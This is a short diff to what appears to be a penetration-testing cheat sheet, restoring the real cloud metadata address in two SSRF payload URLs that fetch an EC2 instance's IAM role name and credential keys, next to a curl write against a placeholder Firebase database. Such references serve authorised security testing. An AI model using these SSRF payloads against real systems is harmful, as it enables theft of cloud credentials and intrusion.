@@ -30,8 +30,8 @@ curl --max-time 30 --connect-timeout 10 -s -X PUT "https://TARGET-APP.firebaseio
 
 ### EC2 Metadata (via SSRF)
 ```bash
-http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/  # role name
-http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
+http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
 ```
 
 ### Exposed Admin Panels
